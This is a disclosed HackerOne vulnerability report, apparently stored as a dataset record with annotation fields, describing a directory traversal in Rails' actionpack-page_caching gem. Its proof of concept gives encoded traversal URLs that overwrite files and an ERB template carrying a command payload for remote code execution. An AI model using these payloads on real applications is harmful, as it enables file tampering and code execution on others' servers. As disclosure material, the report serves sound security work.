{
  "reported_to": "Ruby on Rails",
  "reported_by": "ooooooo_q ",
  "title": "File writing by Directory traversal at actionpack-page_caching and RCE by it",
  "content": "\nI found a directory traversal in actionpack-page_caching.\nSome code may lead to RCE.\nhttps://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143\nCode 384 Bytes\n1  def cache_file(path, extension)\n2    if path.empty? || path =~ %r{\\A/+\\z}\n3      name = \"/index\"\n4    else\n5      name = URI.parser.unescape(path.chomp(\"/\"))\n6    end\n7\n8    if File.extname(name).empty?\n9      name + (extension || default_extension)\n10    else\n11      name\n12    end\n13  end\n14\n15  def cache_path(path, extension = nil)\n16    File.join(cache_directory, cache_file(path, extension))\n17  end\nThe problem is that traversal is not considered in cache_path or cache_file.\nSince the URL can use . or/encoded values, the cache will be written in an unexpected place.\nPoC\nstep 1. Prepare server\nCode 193 Bytes\n1ruby -v\n2\n3rails -v\n4\n5rails new caching_traversal\n6\n7cd caching_traversal\n8\n9# add `gem \"actionpack-page_caching\"` in Gemfile\n10\n11bundle install\n12\n13rails generate scaffold book name:string\n14rails db:migrate\nstep 2. Setting cache\nEnable caching.\nCode 15 Bytes\n1rails dev:cache\nAdd caches_page.\nCode 171 Bytes\n1# app/controllers/books_contorller.rb\n2class BooksController < ApplicationController\n3  before_action :set_book, only: [:show, :edit, :update, :destroy]\n4\n5  caches_page :show\nstep 3. Start server\nStart the server with \"rails s\".\nPrepare a book with the following name.\nCode 17 Bytes\n1<% `toouch me` %>\nCheck cache behavior.\nCode 400 Bytes\n1\u276f curl \"http://localhost:3000/books/1\"\n2<!DOCTYPE html>\n3...\n4<p>\n5  <strong>Name:</strong>\n6  &lt;% `touch me` %&gt;\n7</p>\n8...\n9\n10\u276f ls public\n11404.html  500.html                          apple-touch-icon.png  favicon.ico\n12422.html  apple-touch-icon-precomposed.png  books                 robots.txt\n13\n14\u276f cat public/books/1.html\n15<!DOCTYPE html>\n16...\n17<p>\n18  <strong>Name:</strong>\n19  &lt;% `touch me` %&gt;\n20</p>\n21...\n22\nstep 4. Attack\nAdd an attack code to the pass and check the result.\nCode 494 Bytes\n1\u276f curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest\"\n2\n3# test file is generated\n4\u276f ls\n5app  config     db       Gemfile.lock  log           public    README.md  test       tmp\n6bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor\n7\n8\n9\u276f curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd\"\n10\n11# If the file exists it will be overwritten\n12\u276f cat README.md\n13...\n14<p>\n15  <strong>Name:</strong>\n16  &lt;% `touch me` %&gt;\n17</p>\n18...\nstep 5. RCE\nRCE is possible if it is possible to create a cache where the value of <% is not escaped, like render for text.\nGenerate the file app/views/books/show.text.erb as follows:\nCode 24 Bytes\n1name: <%= @ book.name %>\nOverwriting erb files enables RCE.\nCode 498 Bytes\n1# overwrite erb\n2\u276f curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text\"\n3name: <% `touch me` %>\n4\n5\u276f cat app/views/books/show.text.erb\n6name: <% `touch me` %>\n7\n8\n9# executed `touch me`\n10\u276f curl \"http://localhost:3000/books/1.txt\"\n11name:\n12\n13# me file is generated\n14\u276f ls\n15app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor\n16bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp\nImpact\nThe cache is generated on an unintended path. Also, RCE may be possible.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1000,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1594622700,
  "report_url": "https://hackerone.com/reports/519220",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a Rails application with actionpack-page_caching gem and scaffold a book model"
    ],
    [
      2,
      "Enable caching and configure caches_page for the show action in BooksController"
    ],
    [
      3,
      "Start the server and create a book with a malicious name containing ERB code"
    ],
    [
      4,
      "Exploit directory traversal by accessing a crafted URL to write cache files to unintended locations"
    ],
    [
      5,
      "Overwrite ERB templates to achieve Remote Code Execution (RCE)"
    ]
  ],
  "vuln_description": "The vulnerability involves a directory traversal flaw in actionpack-page_caching that allows writing cache files to unintended locations. This can be exploited to overwrite ERB templates, leading to Remote Code Execution (RCE) when the templates are rendered.",
  "reason": "The attack requires understanding of Rails caching mechanisms, directory traversal techniques, and ERB template rendering. The interaction between these components is non-obvious, and the attacker must manipulate the application state to achieve RCE.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}